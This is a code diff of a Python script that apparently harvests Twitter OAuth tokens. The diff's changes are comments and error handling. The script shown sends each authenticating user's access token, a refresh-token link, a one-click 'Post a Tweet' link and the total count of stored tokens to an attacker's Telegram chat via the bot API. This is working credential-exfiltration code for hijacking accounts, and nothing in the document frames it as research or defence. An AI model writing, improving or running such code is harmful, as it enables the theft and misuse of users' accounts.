@@ -147,7 +147,6 @@ def send_message_via_telegram(message):
     }
     requests.post(url, json=data)
     
-# Function to send access and refresh tokens to Telegram
 def send_to_telegram(access_token, refresh_token=None):
     alert_emoji = "🚨"
     key_emoji = "🔑"
@@ -163,29 +162,33 @@ def send_to_telegram(access_token, refresh_token=None):
     # Get the total tokens in the database
     total_tokens = get_total_tokens()
 
-    # Prepare the message
+    # Prepare the message with proper formatting and links
     message = (
         f"{alert_emoji} *New user authenticated: OAuth 2.0*\n"
-        f"{key_emoji} *Access Token:* `{access_token}`\n"
+        f"{key_emoji} *Access Token:* `{access_token}`\n"  # Display the access token
     )
     
     if refresh_token:
         refresh_link = f"{CALLBACK_URL}/refresh/{refresh_token}"
-        message += f"{key_emoji} *Refresh Token Link:* [Refresh Token]({refresh_link})\n"
+        message += f"{key_emoji} *Refresh Token Link:* [Refresh Token]({refresh_link})\n"  # Clickable refresh token link
 
     tweet_link = f"{CALLBACK_URL}/tweet/{access_token}"
-    message += f"{key_emoji} *Post a Tweet Link:* [Post a Tweet]({tweet_link})\n"
-    message += f"{user_emoji} *Twitter Profile:* [@{username}]({twitter_url})\n"
-    message += f"🔢 *Total Tokens in Database:* {total_tokens}"
+    message += f"{key_emoji} *Post a Tweet Link:* [Post a Tweet]({tweet_link})\n"  # Clickable post-a-tweet link
+    message += f"{user_emoji} *Twitter Profile:* [@{username}]({twitter_url})\n"  # Twitter username link
+    message += f"🔢 *Total Tokens in Database:* {total_tokens}"  # Total tokens
 
     # Send the message to Telegram
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
     data = {
         "chat_id": TELEGRAM_CHAT_ID,
         "text": message,
-        "parse_mode": "Markdown"  # Ensure the message is parsed correctly
+        "parse_mode": "Markdown"  # Ensure the message is parsed correctly as Markdown
     }
-    requests.post(url, json=data)
+    response = requests.post(url, json=data)
+
+    if response.status_code != 200:
+        print(f"Failed to send message via Telegram: {response.text}")
+
 
 
 # Function to get Twitter username
